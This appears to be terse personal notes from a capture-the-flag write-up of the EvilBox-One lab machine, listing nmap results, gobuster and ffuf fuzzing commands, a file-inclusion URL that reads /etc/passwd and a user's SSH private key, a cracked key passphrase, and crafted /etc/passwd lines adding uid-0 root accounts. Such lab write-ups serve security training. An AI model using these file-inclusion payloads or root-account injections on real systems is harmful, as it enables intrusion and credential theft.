SS----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# EvilBox-One
# 3/1/2023

----------------------------------------------------
# nmap result / exploitation
----------------------------------------------------
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))



└─$ gobuster dir -u http://192.168.75.212/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php
http://192.168.75.212/secret/evil.php

 ffuf -u ‘http://192.168.1.21/secret/evil.php?FUZZ=/etc/passwd’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0


 http://192.168.75.212/secret/evil.php?command=/../../../../etc/passwd

 http://192.168.75.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa
 unicorn          (id_rsa)     

$1$n5MNRFce$IqIMbAmFoYh6M93bjwaht/
abc

shub:$1$KifAwBLs$.cDn/iZ5OvQVXo9e/P2el0:0:0:root:/root:/bin/bash
hacker2:$1$abc$l.v9MnhgHlYBMhmsc8j3O1:0:0:root:/root:/bin/bash
```
